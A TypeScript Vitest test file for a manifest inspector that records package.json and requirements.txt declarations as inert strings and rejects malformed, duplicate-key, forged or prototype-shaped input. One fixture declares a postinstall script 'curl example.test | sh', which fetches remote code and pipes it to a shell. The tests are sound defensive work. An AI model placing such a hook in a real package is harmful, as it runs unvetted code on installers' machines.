import { expect, it } from "vitest";
import { inspectDeclarations, parseDeclarations } from "./declarations";
const inspect = (text: string, path = "package.json") => inspectDeclarations({ path, text, sha256: "a".repeat(64) });
it("records declared runtimes, platform restrictions, scripts and dependency groups as inert strings", () => {
  const result = inspect(JSON.stringify({ packageManager: "pnpm@10", engines: { node: ">=22" }, os: ["!darwin"], cpu: ["arm64"], scripts: { postinstall: "curl example.test | sh" }, dependencies: { react: "^19" }, optionalDependencies: { gpu: "*" }, peerDependencies: { host: ">=1" }, devDependencies: { vite: "^7" } }));
  expect(result.status).toBe("observed"); expect(result.declarations).toHaveLength(9);
  expect(result.declarations).toContainEqual({ category: "script", name: "scripts.postinstall", value: "curl example.test | sh" });
  expect(parseDeclarations([result])).toEqual([result]); expect(result).not.toHaveProperty("compatible");
});
it("rejects malformed, duplicate/escaped-key and deeply nested JSON without claiming no requirements", () => {
  for (const text of ["{", "[]", '{"scripts":{},"scripts":{"install":"danger"}}', String.raw`{"engines":{},"eng\u0069nes":{"node":"20"}}`, `{"extra":${"[".repeat(65)}0${"]".repeat(65)}}`]) {
    const result = inspect(text); expect(result.status).toBe("invalid"); expect(result.declarations).toEqual([]); expect(result.issues.length).toBeGreaterThan(0);
  }
});
it("handles braces and repeated values inside strings without false duplicate keys", () => {
  const result = inspect(JSON.stringify({ scripts: { a: '{"a":1}', b: '{"a":1}' }, dependencies: { a: "1" } }));
  expect(result.status).toBe("observed"); expect(result.declarations).toHaveLength(3);
});
it("reports malformed field values and bounded omissions instead of silently truncating", () => {
  const result = inspect(JSON.stringify({ engines: ["node"], scripts: { invalid: null, huge: "x".repeat(257) }, dependencies: Object.fromEntries(Array.from({ length: 30 }, (_, i) => [`dep${i}`, "^1"])) }));
  expect(result.status).toBe("partial"); expect(result.declarations).toHaveLength(12); expect(result.omitted).toBe(21);
  expect(result.issues).toEqual(expect.arrayContaining(["shape", "output-limit"]));
  const unicode = inspect(JSON.stringify({ dependencies: Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`dep${i}`, "界".repeat(250)])) }));
  expect(new TextEncoder().encode(JSON.stringify(unicode)).length).toBeLessThan(4000); expect(unicode.omitted).toBeGreaterThan(0);
});
it("reads simple requirements lines but never follows includes, indexes, URLs or evaluates markers", () => {
  const result = inspect("# comment\nnumpy==2.0\nrequests\n-r other.txt\n--index-url https://example.test\ntorch; platform_system == 'Linux'\nfoo[extra]>=1,<=2\n", "requirements.txt");
  expect(result.status).toBe("partial"); expect(result.declarations.filter((d) => d.category === "dependency")).toHaveLength(2);
  expect(result.declarations.filter((d) => d.category === "unparsed")).toHaveLength(4); expect(result.issues).toContain("complex-requirement");
});
it("keeps unsupported formats and empty supported coverage distinct", () => {
  expect(inspect("[project]\ndependencies=[]", "pyproject.toml").status).toBe("unsupported");
  expect(inspect("{}" )).toMatchObject({ status: "observed", declarations: [], omitted: 0 });
  expect(inspect("x".repeat(262145)).issues).toContain("input-limit");
});
it("rejects forged authority, bad hashes, oversized lists and inconsistent coverage", () => {
  const report = inspect('{"engines":{"node":"22"}}');
  for (const changed of [{ ...report, verified: true }, { ...report, sha256: "bad" }, { ...report, path: "README.md" }, { ...report, status: "observed", omitted: 1 }, { ...report, declarations: [{ ...report.declarations[0], grant: "shell" }] }]) expect(() => parseDeclarations([changed])).toThrow();
  expect(() => parseDeclarations(Array(5).fill(report))).toThrow();
});
it("does not treat prototype-shaped keys as host state or inherited fields", () => {
  const result = inspect('{"__proto__":{"engines":{"node":"1"}},"dependencies":{"__proto__":"x"}}');
  expect(result.declarations).toEqual([{ category: "dependency", name: "dependencies.__proto__", value: "x" }]);
  expect(({} as { engines?: unknown }).engines).toBeUndefined();
});
